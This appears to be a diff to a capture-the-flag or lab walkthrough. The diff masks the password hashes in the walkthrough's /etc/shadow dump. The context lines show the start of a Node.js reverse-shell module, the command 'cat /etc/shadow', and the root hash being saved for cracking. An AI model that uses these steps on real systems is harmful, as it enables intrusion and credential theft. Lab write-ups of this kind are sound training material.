@@ -128,7 +128,7 @@ nano reverse.js
 ```
 
 Code:
-```js
+```
 module.exports = function() {
     var net = require("net");
     var cp = require("child_process");
@@ -219,7 +219,7 @@ cat /etc/shadow
 
 Info:
 ```
-root:$y$j9T$9VFLJjKZix0Ugj9YsoOCS.$z0FVk.1CCNx/YRzEmwjcz6z4oYqa7YD6QyXd52jxyLD:20374:0:99999:7:::
+root:$y$j9T$9VFLJjKZix0Ugj9YsoOCSxxxxxxxxxxxx6z4oYqa7YD6QyXd52jxyLD:20374:0:99999:7:::
 daemon:*:19676:0:99999:7:::
 bin:*:19676:0:99999:7:::
 sys:*:19676:0:99999:7:::
@@ -240,14 +240,14 @@ nobody:*:19676:0:99999:7:::
 systemd-network:!*:19676::::::
 messagebus:!:19676::::::
 sshd:!:19676::::::
-a.clark:$y$j9T$bdXHrEdVSpm8nJ883AVV//$xAqdqEdokPrYPBIgIv68qKaU08mhJoWKrnI9WdyUpZB:20374:0:99999:7:::
+a.clark:$y$j9T$bdXHrEdVSpm8nJ8xxxxxxxxxxqKaU08mhJoWKrnI9WdyUpZB:20374:0:99999:7:::
 ftp:!:20374::::::
 ```
 
 We retrieve the root user's `password hash` (in yescrypt format) and save it to a `hash.txt` file for cracking.
 
 ```
-$y$j9T$9VFLJjKZix0Ugj9YsoOCS.$z0FVk.1CCNx/YRzEmwjcz6z4oYqa7YD6QyXd52jxyLD
+$y$j9T$9VFLJjKZix0Ugj9YsoOCS.xxxxxxxxxxRzEmwjcz6z4oYqa7YD6QyXd52jxyLD
 ```
 
 ```bash
